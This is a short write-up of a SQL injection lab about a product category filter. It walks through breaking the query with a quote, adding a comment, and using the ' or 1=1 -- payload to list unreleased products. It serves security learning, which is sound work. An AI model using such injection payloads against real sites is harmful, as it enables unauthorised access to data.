# Description:

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 

# Analysis: 

SQL injection - Product Category Filter

Query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1

End goal: display all products both released unreleased.

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Broke the application by adding a ' sql character to the query stringto see if this is vulnerabilitiesto sql injection:
    SELECT * FROM products WHERE category = ''' AND released = 1

Put a sql comment to see if this is SQL injection vulnerable:
    SELECT * FROM products WHERE category = ''--' AND released = 1

Query to display all the products:
    SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1

Need to be in the same file to run python3.
